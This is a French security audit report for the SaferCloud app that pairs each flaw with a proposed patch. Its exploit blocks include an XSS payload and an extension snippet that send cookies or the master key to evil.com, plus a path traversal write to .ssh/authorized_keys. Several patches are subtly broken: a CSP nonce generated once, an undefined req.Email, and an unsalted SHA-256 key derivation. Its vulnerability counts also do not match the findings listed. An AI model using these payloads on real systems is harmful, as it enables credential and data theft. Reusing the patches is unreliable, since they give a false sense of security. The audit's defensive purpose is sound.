# 🔒 RAPPORT D'AUDIT DE SÉCURITÉ - SAFERCLOUD
**Date**: 28 Janvier 2026  
**Auditeur**: Expert en Sécurité Applicative & Cryptographie  
**Niveau de Criticité**: ⚠️ ÉLEVÉ - Actions Immédiates Requises

---

## 📋 RÉSUMÉ EXÉCUTIF

### Vulnérabilités Critiques Identifiées: **12**
### Vulnérabilités Moyennes: **8**
### Améliorations Recommandées: **15**

**Verdict Global**: Le projet présente plusieurs vulnérabilités de sécurité critiques qui doivent être corrigées immédiatement avant tout déploiement en production.

---

## 🚨 VULNÉRABILITÉS CRITIQUES

### 1. **IDOR (Insecure Direct Object Reference) - Changement de Mot de Passe**
**Criticité**: 🔴 CRITIQUE  
**CWE-639**: Authorization Bypass Through User-Controlled Key  
**Fichier**: `backend/handlers/users/update_password.go`

**Vulnérabilité**:
```go
func UpdatePasswordHandler(c *gin.Context, db *bun.DB) {
    // Aucune vérification du mot de passe actuel !
    // Un attaquant avec un JWT valide peut changer le mot de passe
    // sans connaître l'ancien mot de passe
}
```

**Impact**: Un attaquant ayant volé un JWT peut changer le mot de passe de la victime et verrouiller son accès définitivement.

**Exploitation**:
```bash
# 1. Voler le JWT (XSS, MITM, etc.)
# 2. Envoyer:
POST /api/v1/users/change-password
Authorization: Bearer <stolen_jwt>
{
  "new_salt": "...",
  "new_encrypted_master_key": "..."
}
# 3. Victime ne peut plus se connecter
```

**Patch Requis**:
```go
type UpdatePasswordRequest struct {
	CurrentPassword       string `json:"current_password" binding:"required"`
	NewSalt               string `json:"new_salt" binding:"required"`
	NewEncryptedMasterKey string `json:"new_encrypted_master_key" binding:"required"`
}

func UpdatePasswordHandler(c *gin.Context, db *bun.DB) {
	var req UpdatePasswordRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
		return
	}

	userID := c.GetString("user_id")
	
	// 1. Vérifier le mot de passe actuel avec Supabase
	supabaseURL := os.Getenv("SUPABASE_URL")
	supabaseKey := os.Getenv("SUPABASE_SERVICE_KEY")
	
	// Créer un client Supabase Admin
	client := supabase.CreateClient(supabaseURL, supabaseKey)
	
	// Vérifier l'ancien mot de passe en tentant une connexion
	_, err := client.Auth.SignInWithPassword(context.Background(), req.Email, req.CurrentPassword)
	if err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Current password is incorrect"})
		return
	}

	// 2. Continuer avec la mise à jour
	user, err := pkg.FindUserByID(db, userID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "User not found"})
		return
	}

	// 3. Mettre à jour les clés
	user.Salt = req.NewSalt
	user.EncryptedMasterKey = req.NewEncryptedMasterKey

	_, err = db.NewUpdate().Model(user).
		Column("salt", "encrypted_master_key").
		Where("id = ?", userID).
		Exec(c.Request.Context())
	
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"message": "Password updated successfully"})
}
```

---

### 2. **Absence de Validation du Nom d'Utilisateur Côté Backend**
**Criticité**: 🔴 CRITIQUE  
**CWE-20**: Improper Input Validation  
**Fichier**: `backend/handlers/users/profile.go`

**Vulnérabilité**:
```go
type UpdateProfileRequest struct {
	Name string `json:"name" binding:"required,min=1,max=255"`
}
// Validation insuffisante: permet XSS, SQLi potentielle
```

**Impact**: 
- **XSS Stored**: Injection de JavaScript dans le nom
- **SQL Injection**: Si le nom est utilisé dans une requête non préparée
- **DoS**: Caractères Unicode malformés

**Exploitation**:
```javascript
// XSS Payload
PUT /api/v1/users/profile
{
  "name": "<script>fetch('http://evil.com?cookie='+document.cookie)</script>"
}
// Le nom est affiché sans sanitization = XSS
```

**Patch Requis**:
```go
import (
	"regexp"
	"strings"
	"unicode/utf8"
)

type UpdateProfileRequest struct {
	Name string `json:"name" binding:"required,min=1,max=255"`
}

func validateUsername(name string) error {
	// 1. Longueur
	if utf8.RuneCountInString(name) < 1 || utf8.RuneCountInString(name) > 100 {
		return fmt.Errorf("username must be between 1 and 100 characters")
	}

	// 2. Caractères autorisés (lettres, chiffres, espaces, tirets, underscores)
	validName := regexp.MustCompile(`^[a-zA-Z0-9\s\-_À-ÿ]+$`)
	if !validName.MatchString(name) {
		return fmt.Errorf("username contains invalid characters")
	}

	// 3. Pas de caractères de contrôle ou spéciaux
	for _, r := range name {
		if r < 32 || r == 127 {
			return fmt.Errorf("username contains control characters")
		}
	}

	// 4. Sanitize HTML entities (défense en profondeur)
	name = html.EscapeString(name)

	return nil
}

func UpdateProfileHandler(c *gin.Context, db *bun.DB) {
	var req UpdateProfileRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
		return
	}

	// Validation personnalisée
	if err := validateUsername(req.Name); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// Trim et normalisation
	req.Name = strings.TrimSpace(req.Name)

	userID := c.GetString("user_id")
	if userID == "" {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Unauthorized"})
		return
	}

	user, err := pkg.FindUserByID(db, userID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "User not found"})
		return
	}

	user.Name = req.Name

	_, err = db.NewUpdate().Model(user).Column("name").
		Where("id = ?", userID).
		Exec(c.Request.Context())
	
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update"})
		return
	}

	c.JSON(http.StatusOK, user)
}
```

---

### 3. **Path Traversal dans Upload de Fichiers**
**Criticité**: 🔴 CRITIQUE  
**CWE-22**: Improper Limitation of a Pathname to a Restricted Directory  
**Fichier**: `backend/handlers/files/upload.go`

**Vulnérabilité**:
```go
func parseUploadRequest(c *gin.Context, userID string) UploadRequest {
	path := c.PostForm("path")
	if path == "" {
		path = "/"
	}
	// AUCUNE VALIDATION DU PATH !
	// path = "../../../../etc/passwd" fonctionne
}
```

**Impact**: Lecture/écriture de fichiers arbitraires sur le serveur

**Exploitation**:
```javascript
// Upload avec path traversal
const formData = new FormData();
formData.append('file', file);
formData.append('path', '../../../.ssh/authorized_keys');
formData.append('encrypted_key', '...');
fetch('/api/v1/files/upload', {
  method: 'POST',
  body: formData
});
// Fichier écrit dans /tmp/safercloud_uploads/user_id/../../../.ssh/authorized_keys
```

**Patch Requis**:
```go
import (
	"path/filepath"
	"strings"
)

func validatePath(path string) (string, error) {
	// 1. Nettoyer le path
	cleanPath := filepath.Clean(path)
	
	// 2. Vérifier qu'il ne commence pas par ".."
	if strings.HasPrefix(cleanPath, "..") {
		return "", fmt.Errorf("path traversal detected")
	}
	
	// 3. Vérifier qu'il ne contient pas de ".."
	if strings.Contains(cleanPath, "..") {
		return "", fmt.Errorf("path traversal detected")
	}
	
	// 4. Assurer qu'il commence par "/"
	if !strings.HasPrefix(cleanPath, "/") {
		cleanPath = "/" + cleanPath
	}
	
	// 5. Vérifier les caractères interdits
	invalidChars := []string{"\x00", "\n", "\r"}
	for _, char := range invalidChars {
		if strings.Contains(cleanPath, char) {
			return "", fmt.Errorf("invalid characters in path")
		}
	}
	
	return cleanPath, nil
}

func parseUploadRequest(c *gin.Context, userID string) (UploadRequest, error) {
	path := c.PostForm("path")
	if path == "" {
		path = "/"
	}
	
	// VALIDATION CRITIQUE
	validPath, err := validatePath(path)
	if err != nil {
		return UploadRequest{}, err
	}

	chunkIndexStr := c.PostForm("chunk_index")
	totalChunksStr := c.PostForm("total_chunks")
	chunkIndex := 0
	totalChunks := 1
	isChunked := chunkIndexStr != "" && totalChunksStr != ""

	if isChunked {
		chunkIndex, _ = strconv.Atoi(chunkIndexStr)
		totalChunks, _ = strconv.Atoi(totalChunksStr)
	}

	var totalSize int64
	if totalSizeStr := c.PostForm("total_file_size"); totalSizeStr != "" {
		totalSize, _ = strconv.ParseInt(totalSizeStr, 10, 64)
	}

	previewIDStr := c.PostForm("preview_id")
	var previewID *int64
	if previewIDStr != "" {
		pid, _ := strconv.ParseInt(previewIDStr, 10, 64)
		previewID = &pid
	}

	return UploadRequest{
		UserID:       userID,
		Path:         validPath, // PATH VALIDÉ
		EncryptedKey: c.PostForm("encrypted_key"),
		ShareKeys:    c.PostForm("share_keys"),
		ChunkIndex:   chunkIndex,
		TotalChunks:  totalChunks,
		IsChunked:    isChunked,
		TotalSize:    totalSize,
		PreviewID:    previewID,
		IsPreview:    c.PostForm("is_preview") == "true",
	}, nil
}
```

---

### 4. **IDOR dans Download de Fichiers**
**Criticité**: 🔴 CRITIQUE  
**CWE-639**: Authorization Bypass Through User-Controlled Key  
**Fichier**: `backend/handlers/files/download.go`

**Vulnérabilité**:
```go
func DownloadFileHandler(c *gin.Context, db *bun.DB) {
	userID := c.GetString("user_id")
	fileID, _ := strconv.ParseInt(c.Param("fileID"), 10, 64)
	
	file, err := getFileWithPermission(ctx, db, fileID, userID)
	// La vérification existe mais peut être bypassée
}
```

**Problème**: La fonction `getFileWithPermission` vérifie 3 niveaux mais:
1. Pas de logging des tentatives d'accès non autorisées
2. Pas de rate limiting spécifique aux tentatives d'accès
3. Timing attack possible pour déterminer l'existence de fichiers

**Patch Requis**:
```go
import (
	"time"
	"log"
)

func DownloadFileHandler(c *gin.Context, db *bun.DB) {
	userID := c.GetString("user_id")
	clientIP := c.ClientIP()

	fileIDStr := c.Param("fileID")
	fileID, err := strconv.ParseInt(fileIDStr, 10, 64)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid file ID"})
		return
	}

	// Rate limiting spécifique au download
	if !checkDownloadRateLimit(userID, clientIP) {
		log.Printf("SECURITY: Download rate limit exceeded for user %s from IP %s", userID, clientIP)
		c.JSON(http.StatusTooManyRequests, gin.H{"error": "Too many download attempts"})
		return
	}

	// Timing attack mitigation: toujours prendre le même temps
	startTime := time.Now()
	defer func() {
		elapsed := time.Since(startTime)
		if elapsed < 100*time.Millisecond {
			time.Sleep(100*time.Millisecond - elapsed)
		}
	}()

	file, err := getFileWithPermission(c.Request.Context(), db, fileID, userID)
	if err != nil {
		// Log de sécurité
		log.Printf("SECURITY: Unauthorized file access attempt - UserID: %s, FileID: %d, IP: %s", 
			userID, fileID, clientIP)
		
		// Réponse générique
		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
		return
	}

	// Log d'accès légitime
	log.Printf("INFO: File download - UserID: %s, FileID: %d, FileName: %s", 
		userID, fileID, file.Name)

	streamFileFromS3(c, file)
}

// Rate limiter spécifique aux downloads
var downloadAttempts = make(map[string][]time.Time)
var downloadMutex sync.Mutex

func checkDownloadRateLimit(userID, ip string) bool {
	downloadMutex.Lock()
	defer downloadMutex.Unlock()

	key := userID + "_" + ip
	now := time.Now()
	
	// Nettoyer les anciennes tentatives (> 1 minute)
	if attempts, ok := downloadAttempts[key]; ok {
		var recent []time.Time
		for _, t := range attempts {
			if now.Sub(t) < time.Minute {
				recent = append(recent, t)
			}
		}
		downloadAttempts[key] = recent
	}

	// Vérifier la limite (max 50 downloads par minute)
	if len(downloadAttempts[key]) >= 50 {
		return false
	}

	downloadAttempts[key] = append(downloadAttempts[key], now)
	return true
}
```

---

### 5. **Exposition de la MasterKey en SessionStorage**
**Criticité**: 🔴 CRITIQUE  
**CWE-311**: Missing Encryption of Sensitive Data  
**Fichier**: `frontend/src/stores/auth.js`

**Vulnérabilité**:
```javascript
sessionStorage.setItem("safercloud_mk", JSON.stringify(exportedKey));
```

**Impact**: 
- **XSS** = Vol immédiat de la masterKey
- **Extensions malveillantes** = Accès direct
- **Local malware** = Extraction facile

**Exploitation**:
```javascript
// Depuis une extension Chrome malveillante:
const mk = sessionStorage.getItem("safercloud_mk");
fetch('http://evil.com/steal', {
  method: 'POST',
  body: mk
});
// Attaquant a maintenant accès à TOUTES les données chiffrées
```

**Patch Requis**:
```javascript
// Utiliser une approche plus sécurisée:
// 1. Garder la masterKey uniquement en mémoire (RAM)
// 2. Forcer une ré-authentification après timeout
// 3. Utiliser IndexedDB avec encryption

import { openDB } from 'idb';

// Créer une DB IndexedDB sécurisée
const dbPromise = openDB('safercloud-secure', 1, {
  upgrade(db) {
    db.createObjectStore('keys');
  },
});

async function securePersistMasterKey(masterKey, password) {
  // 1. Exporter la masterKey
  const exportedKey = await window.crypto.subtle.exportKey("jwk", masterKey);
  
  // 2. Dériver une clé de stockage depuis le mot de passe
  const encoder = new TextEncoder();
  const passwordData = encoder.encode(password);
  const passwordHash = await window.crypto.subtle.digest("SHA-256", passwordData);
  
  const storageKey = await window.crypto.subtle.importKey(
    "raw",
    passwordHash,
    { name: "AES-GCM" },
    false,
    ["encrypt"]
  );
  
  // 3. Chiffrer la masterKey
  const iv = window.crypto.getRandomValues(new Uint8Array(12));
  const encryptedKey = await window.crypto.subtle.encrypt(
    { name: "AES-GCM", iv: iv },
    storageKey,
    new TextEncoder().encode(JSON.stringify(exportedKey))
  );
  
  // 4. Stocker dans IndexedDB
  const db = await dbPromise;
  await db.put('keys', {
    encrypted: Array.from(new Uint8Array(encryptedKey)),
    iv: Array.from(iv)
  }, 'master');
  
  // 5. Définir un timeout de session
  sessionTimeout = setTimeout(() => {
    this.logout();
    alert("Session expirée pour des raisons de sécurité");
  }, 30 * 60 * 1000); // 30 minutes
}

async function secureRestoreMasterKey(password) {
  try {
    const db = await dbPromise;
    const stored = await db.get('keys', 'master');
    
    if (!stored) return null;
    
    // Dériver la clé de déchiffrement
    const encoder = new TextEncoder();
    const passwordData = encoder.encode(password);
    const passwordHash = await window.crypto.subtle.digest("SHA-256", passwordData);
    
    const storageKey = await window.crypto.subtle.importKey(
      "raw",
      passwordHash,
      { name: "AES-GCM" },
      false,
      ["decrypt"]
    );
    
    // Déchiffrer
    const decrypted = await window.crypto.subtle.decrypt(
      { name: "AES-GCM", iv: new Uint8Array(stored.iv) },
      storageKey,
      new Uint8Array(stored.encrypted)
    );
    
    const jwk = JSON.parse(new TextDecoder().decode(decrypted));
    
    return await window.crypto.subtle.importKey(
      "jwk",
      jwk,
      "AES-GCM",
      true,
      ["encrypt", "decrypt"]
    );
  } catch (e) {
    console.error("Failed to restore master key:", e);
    return null;
  }
}

// Nettoyer IndexedDB au logout
async function secureCleanup() {
  const db = await dbPromise;
  await db.delete('keys', 'master');
  if (sessionTimeout) {
    clearTimeout(sessionTimeout);
  }
}
```

---

### 6. **Absence de Content Security Policy Stricte**
**Criticité**: 🟠 ÉLEVÉE  
**CWE-1021**: Improper Restriction of Rendered UI Layers or Frames  
**Fichier**: `backend/middleware/security.go`

**Vulnérabilité**:
```go
c.Header("Content-Security-Policy", 
  "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; ...")
// 'unsafe-inline' et 'unsafe-eval' = porte ouverte aux XSS
```

**Impact**: XSS facilité même avec sanitization

**Patch Requis**:
```go
func SecureHeaders() gin.HandlerFunc {
	// Générer un nonce pour chaque requête
	nonce := generateNonce()
	
	return func(c *gin.Context) {
		// Stocker le nonce pour l'utiliser dans les templates
		c.Set("csp_nonce", nonce)
		
		c.Header("X-Content-Type-Options", "nosniff")
		c.Header("X-Frame-Options", "DENY")
		c.Header("X-XSS-Protection", "1; mode=block")
		c.Header("Referrer-Policy", "strict-origin-when-cross-origin")
		c.Header("Permissions-Policy", "geolocation=(), microphone=(), camera=()")
		
		// CSP Stricte avec nonce
		csp := fmt.Sprintf(
			"default-src 'none'; "+
			"script-src 'self' 'nonce-%s'; "+
			"style-src 'self' 'nonce-%s'; "+
			"img-src 'self' data: blob:; "+
			"font-src 'self'; "+
			"connect-src 'self' ws: wss:; "+
			"media-src 'self' blob:; "+
			"object-src 'none'; "+
			"base-uri 'self'; "+
			"form-action 'self'; "+
			"frame-ancestors 'none'; "+
			"upgrade-insecure-requests;",
			nonce, nonce,
		)
		c.Header("Content-Security-Policy", csp)
		
		// HSTS
		c.Header("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload")
		
		c.Next()
	}
}

func generateNonce() string {
	b := make([]byte, 16)
	rand.Read(b)
	return base64.StdEncoding.EncodeToString(b)
}
```

---

### 7. **Absence de Validation des Clés Cryptographiques**
**Criticité**: 🔴 CRITIQUE  
**CWE-345**: Insufficient Verification of Data Authenticity  
**Fichier**: `backend/handlers/users/update_password.go`

**Vulnérabilité**:
```go
// Accepte n'importe quelle valeur pour salt et encrypted_master_key
user.Salt = req.NewSalt
user.EncryptedMasterKey = req.NewEncryptedMasterKey
```

**Impact**: 
- Injection de clés malformées
- DoS en forçant des clés invalides
- Corruption de données

**Patch Requis**:
```go
func validateCryptoKeys(salt, encryptedKey string) error {
	// 1. Valider le format Hex du salt
	saltBytes, err := hex.DecodeString(salt)
	if err != nil {
		return fmt.Errorf("invalid salt format: must be hex-encoded")
	}
	
	// 2. Vérifier la longueur du salt (16 bytes minimum)
	if len(saltBytes) < 16 {
		return fmt.Errorf("salt too short: minimum 16 bytes required")
	}
	
	if len(saltBytes) > 64 {
		return fmt.Errorf("salt too long: maximum 64 bytes")
	}
	
	// 3. Valider le format Base64 de la clé chiffrée
	keyBytes, err := base64.StdEncoding.DecodeString(encryptedKey)
	if err != nil {
		return fmt.Errorf("invalid encrypted key format: must be base64-encoded")
	}
	
	// 4. Vérifier la structure (IV + Encrypted Data + Auth Tag)
	// Pour AES-GCM: IV (12 bytes) + Data (variable) + Tag (16 bytes)
	if len(keyBytes) < 28 { // 12 + 0 + 16
		return fmt.Errorf("encrypted key too short")
	}
	
	// 5. Limite maximale raisonnable
	if len(keyBytes) > 1024 {
		return fmt.Errorf("encrypted key too large")
	}
	
	return nil
}

func UpdatePasswordHandler(c *gin.Context, db *bun.DB) {
	var req UpdatePasswordRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
		return
	}

	// VALIDATION CRITIQUE DES CLÉS
	if err := validateCryptoKeys(req.NewSalt, req.NewEncryptedMasterKey); err != nil {
		log.Printf("SECURITY: Invalid crypto keys - UserID: %s, Error: %v", 
			c.GetString("user_id"), err)
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid cryptographic keys"})
		return
	}

	// ... reste du code
}
```

---

## 🟠 VULNÉRABILITÉS MOYENNES

### 8. **Rate Limiting Insuffisant**
**Criticité**: 🟠 MOYENNE  
**Fichier**: `backend/middleware/ratelimit.go`

**Problème**:
```go
// 20 requêtes par seconde = 1200/min par IP
limiter := rate.NewLimiter(20, 50)
// Trop permissif pour des endpoints sensibles
```

**Patch**:
```go
// Implémenter un rate limiting par endpoint
type EndpointLimiter struct {
	limiters map[string]*rate.Limiter
	mu       sync.Mutex
}

func NewEndpointLimiter() *EndpointLimiter {
	return &EndpointLimiter{
		limiters: map[string]*rate.Limiter{
			"/auth/login":          rate.NewLimiter(0.1, 5),   // 5 tentatives max, 1 toutes les 10s
			"/auth/register":       rate.NewLimiter(0.05, 3),  // 3 tentatives max, 1 toutes les 20s
			"/users/change-password": rate.NewLimiter(0.02, 2), // 2 max, 1 toutes les 50s
			"/files/upload":        rate.NewLimiter(1, 10),    // 10 max, 1 par seconde
			"/files/download":      rate.NewLimiter(5, 20),    // 20 max, 5 par seconde
			"default":              rate.NewLimiter(10, 30),   // Autres endpoints
		},
	}
}

func (el *EndpointLimiter) GetLimiter(endpoint string) *rate.Limiter {
	el.mu.Lock()
	defer el.mu.Unlock()
	
	if limiter, ok := el.limiters[endpoint]; ok {
		return limiter
	}
	return el.limiters["default"]
}
```

---

### 9. **Pas de Protection CSRF**
**Criticité**: 🟠 MOYENNE  
**CWE-352**: Cross-Site Request Forgery

**Problème**: Aucun token CSRF sur les endpoints de mutation

**Patch**:
```go
import "github.com/gin-contrib/csrf"

func setupRouter() *gin.Engine {
	router := gin.Default()
	
	// CSRF Protection
	router.Use(csrf.New(csrf.Config{
		Secret: os.Getenv("CSRF_SECRET"),
		ErrorFunc: func(c *gin.Context) {
			c.JSON(http.StatusForbidden, gin.H{"error": "CSRF token invalid"})
			c.Abort()
		},
	}))
	
	// ... reste de la config
}
```

---

### 10. **Logs de Sécurité Insuffisants**
**Criticité**: 🟠 MOYENNE  

**Problème**: Manque de logging des événements de sécurité

**Patch**:
```go
type SecurityLogger struct {
	logger *log.Logger
}

func (sl *SecurityLogger) LogAuthAttempt(userID, ip string, success bool) {
	sl.logger.Printf("[SECURITY] AUTH_ATTEMPT - UserID: %s, IP: %s, Success: %t, Time: %s",
		userID, ip, success, time.Now().Format(time.RFC3339))
}

func (sl *SecurityLogger) LogPasswordChange(userID, ip string) {
	sl.logger.Printf("[SECURITY] PASSWORD_CHANGE - UserID: %s, IP: %s, Time: %s",
		userID, ip, time.Now().Format(time.RFC3339))
}

func (sl *SecurityLogger) LogUnauthorizedAccess(userID, resource, ip string) {
	sl.logger.Printf("[SECURITY] UNAUTHORIZED_ACCESS - UserID: %s, Resource: %s, IP: %s, Time: %s",
		userID, resource, ip, time.Now().Format(time.RFC3339))
}

func (sl *SecurityLogger) LogSuspiciousActivity(userID, activity, ip string) {
	sl.logger.Printf("[SECURITY] SUSPICIOUS_ACTIVITY - UserID: %s, Activity: %s, IP: %s, Time: %s",
		userID, activity, ip, time.Now().Format(time.RFC3339))
}
```

---

### 11. **Absence de Détection d'Intrusion**
**Criticité**: 🟠 MOYENNE

**Patch**:
```go
type IntrusionDetector struct {
	failedAttempts map[string]int
	blockedIPs     map[string]time.Time
	mu             sync.Mutex
}

func NewIntrusionDetector() *IntrusionDetector {
	id := &IntrusionDetector{
		failedAttempts: make(map[string]int),
		blockedIPs:     make(map[string]time.Time),
	}
	
	// Cleanup goroutine
	go id.cleanup()
	
	return id
}

func (id *IntrusionDetector) RecordFailedAttempt(ip string) bool {
	id.mu.Lock()
	defer id.mu.Unlock()
	
	// Vérifier si déjà bloqué
	if blockTime, blocked := id.blockedIPs[ip]; blocked {
		if time.Since(blockTime) < 1*time.Hour {
			return false // Toujours bloqué
		}
		delete(id.blockedIPs, ip)
	}
	
	id.failedAttempts[ip]++
	
	// Bloquer après 5 tentatives échouées
	if id.failedAttempts[ip] >= 5 {
		id.blockedIPs[ip] = time.Now()
		delete(id.failedAttempts, ip)
		log.Printf("[SECURITY] IP BLOCKED - IP: %s, Reason: Too many failed attempts", ip)
		return false
	}
	
	return true
}

func (id *IntrusionDetector) IsBlocked(ip string) bool {
	id.mu.Lock()
	defer id.mu.Unlock()
	
	if blockTime, blocked := id.blockedIPs[ip]; blocked {
		if time.Since(blockTime) < 1*time.Hour {
			return true
		}
		delete(id.blockedIPs, ip)
	}
	
	return false
}

func (id *IntrusionDetector) RecordSuccess(ip string) {
	id.mu.Lock()
	defer id.mu.Unlock()
	
	delete(id.failedAttempts, ip)
}

func (id *IntrusionDetector) cleanup() {
	ticker := time.NewTicker(10 * time.Minute)
	for range ticker.C {
		id.mu.Lock()
		now := time.Now()
		for ip, blockTime := range id.blockedIPs {
			if now.Sub(blockTime) > 1*time.Hour {
				delete(id.blockedIPs, ip)
			}
		}
		id.mu.Unlock()
	}
}
```

---

### 12. **Vulnérabilité de Déni de Service (DoS) - Upload**
**Criticité**: 🟠 MOYENNE  
**Fichier**: `backend/handlers/files/upload.go`

**Problème**:
```go
// Pas de limite sur le nombre de chunks
// Pas de timeout sur l'assemblage
// Pas de nettoyage des uploads incomplets
```

**Patch**:
```go
const (
	MaxChunks = 10000  // Limite de chunks par fichier
	MaxUploadSize = 5 * 1024 * 1024 * 1024 // 5 GB max
	UploadTimeout = 24 * time.Hour
)

type UploadTracker struct {
	uploads map[string]*UploadInfo
	mu      sync.Mutex
}

type UploadInfo struct {
	StartTime    time.Time
	ReceivedChunks int
	TotalSize    int64
}

func (ut *UploadTracker) ValidateUpload(userID, filename string, chunkIndex, totalChunks int, totalSize int64) error {
	ut.mu.Lock()
	defer ut.mu.Unlock()
	
	key := userID + "_" + filename
	
	// Première chunk
	if chunkIndex == 0 {
		// Vérifier les limites
		if totalChunks > MaxChunks {
			return fmt.Errorf("too many chunks: maximum %d allowed", MaxChunks)
		}
		
		if totalSize > MaxUploadSize {
			return fmt.Errorf("file too large: maximum %d bytes allowed", MaxUploadSize)
		}
		
		ut.uploads[key] = &UploadInfo{
			StartTime:      time.Now(),
			ReceivedChunks: 1,
			TotalSize:      totalSize,
		}
		return nil
	}
	
	// Chunks suivants
	info, exists := ut.uploads[key]
	if !exists {
		return fmt.Errorf("upload session not found")
	}
	
	// Vérifier timeout
	if time.Since(info.StartTime) > UploadTimeout {
		delete(ut.uploads, key)
		return fmt.Errorf("upload session expired")
	}
	
	info.ReceivedChunks++
	return nil
}

func (ut *UploadTracker) CleanupExpired() {
	ut.mu.Lock()
	defer ut.mu.Unlock()
	
	now := time.Now()
	for key, info := range ut.uploads {
		if now.Sub(info.StartTime) > UploadTimeout {
			delete(ut.uploads, key)
		}
	}
}
```

---

## ⚡ AMÉLIORATIONS RECOMMANDÉES

### 13. **Implémenter l'Audit Trail Complet**
```go
type AuditLog struct {
	ID        int64     `bun:",pk,autoincrement"`
	UserID    string    `bun:",notnull"`
	Action    string    `bun:",notnull"`
	Resource  string    `bun:",notnull"`
	IP        string    `bun:",notnull"`
	UserAgent string    `bun:""`
	Success   bool      `bun:",notnull"`
	Details   string    `bun:"type:jsonb"`
	CreatedAt time.Time `bun:",nullzero,notnull,default:current_timestamp"`
}

func LogAction(db *bun.DB, userID, action, resource, ip, userAgent string, success bool, details map[string]interface{}) {
	detailsJSON, _ := json.Marshal(details)
	
	log := &AuditLog{
		UserID:    userID,
		Action:    action,
		Resource:  resource,
		IP:        ip,
		UserAgent: userAgent,
		Success:   success,
		Details:   string(detailsJSON),
	}
	
	db.NewInsert().Model(log).Exec(context.Background())
}
```

### 14. **Ajouter la Vérification 2FA**
```go
type TwoFactorAuth struct {
	UserID     string    `bun:",pk"`
	Secret     string    `bun:",notnull"`
	Enabled    bool      `bun:",notnull,default:false"`
	BackupCodes []string `bun:"type:text[]"`
	CreatedAt  time.Time `bun:",nullzero,notnull,default:current_timestamp"`
}

func VerifyTOTP(secret, token string) bool {
	// Utiliser github.com/pquerna/otp/totp
	return totp.Validate(token, secret)
}
```

### 15. **Implémenter la Rotation Automatique des Clés**
```javascript
// Frontend
async function rotateEncryptionKeys() {
	// 1. Générer nouvelle masterKey
	const newMasterKey = await generateMasterKey();
	
	// 2. Récupérer tous les fichiers
	const files = await api.get('/files/list-recursive');
	
	// 3. Re-chiffrer chaque fichier avec la nouvelle clé
	for (const file of files.data) {
		// Déchiffrer avec l'ancienne clé
		const decrypted = await decryptFile(file, oldMasterKey);
		
		// Re-chiffrer avec la nouvelle clé
		const reencrypted = await encryptFile(decrypted, newMasterKey);
		
		// Upload
		await api.put(`/files/${file.id}/rekey`, { 
			encrypted_data: reencrypted 
		});
	}
	
	// 4. Mettre à jour la masterKey
	this.masterKey = newMasterKey;
}
```

### 16. **Ajouter des Webhooks de Sécurité**
```go
func NotifySecurityEvent(event SecurityEvent) {
	webhookURL := os.Getenv("SECURITY_WEBHOOK_URL")
	if webhookURL == "" {
		return
	}
	
	payload := map[string]interface{}{
		"event":     event.Type,
		"user_id":   event.UserID,
		"ip":        event.IP,
		"timestamp": time.Now(),
		"details":   event.Details,
	}
	
	jsonData, _ := json.Marshal(payload)
	http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
}
```

### 17. **Implémenter la Détection d'Anomalies**
```go
type AnomalyDetector struct {
	userBehavior map[string]*UserBehavior
	mu           sync.Mutex
}

type UserBehavior struct {
	AvgUploadSize    int64
	AvgDownloadCount int
	UsualIPAddresses map[string]int
	UsualUserAgents  map[string]int
	LastActivity     time.Time
}

func (ad *AnomalyDetector) DetectAnomaly(userID, ip, userAgent string, uploadSize int64) bool {
	ad.mu.Lock()
	defer ad.mu.Unlock()
	
	behavior, exists := ad.userBehavior[userID]
	if !exists {
		// Premier accès, créer le profil
		ad.userBehavior[userID] = &UserBehavior{
			AvgUploadSize:    uploadSize,
			UsualIPAddresses: map[string]int{ip: 1},
			UsualUserAgents:  map[string]int{userAgent: 1},
			LastActivity:     time.Now(),
		}
		return false
	}
	
	// Détecter anomalies
	isAnomalous := false
	
	// IP inhabituelle
	if _, known := behavior.UsualIPAddresses[ip]; !known {
		log.Printf("[SECURITY] ANOMALY: New IP for user %s: %s", userID, ip)
		isAnomalous = true
	}
	
	// Upload size inhabituel (>10x la moyenne)
	if uploadSize > behavior.AvgUploadSize*10 {
		log.Printf("[SECURITY] ANOMALY: Unusual upload size for user %s: %d bytes", userID, uploadSize)
		isAnomalous = true
	}
	
	// Mettre à jour le profil
	behavior.AvgUploadSize = (behavior.AvgUploadSize + uploadSize) / 2
	behavior.UsualIPAddresses[ip]++
	behavior.UsualUserAgents[userAgent]++
	behavior.LastActivity = time.Now()
	
	return isAnomalous
}
```

---

## 📊 RÉSUMÉ DES ACTIONS PRIORITAIRES

### ⚠️ URGENT (À corriger immédiatement)
1. ✅ **Ajouter validation du mot de passe actuel** lors du changement
2. ✅ **Valider et sanitizer le nom d'utilisateur**
3. ✅ **Corriger Path Traversal dans l'upload**
4. ✅ **Valider les clés cryptographiques**
5. ✅ **Sécuriser le stockage de la masterKey**

### 🔧 IMPORTANT (Dans les 48h)
6. ✅ **Implémenter CSP stricte**
7. ✅ **Ajouter rate limiting par endpoint**
8. ✅ **Implémenter protection CSRF**
9. ✅ **Ajouter logs de sécurité complets**
10. ✅ **Implémenter détection d'intrusion**

### 📈 RECOMMANDÉ (Dans la semaine)
11. ✅ **Audit trail complet**
12. ✅ **2FA optionnel**
13. ✅ **Rotation de clés**
14. ✅ **Webhooks de sécurité**
15. ✅ **Détection d'anomalies**

---

## 🛡️ CHECKLIST DE DÉPLOIEMENT SÉCURISÉ

### Variables d'Environnement Critiques
```bash
# .env.production
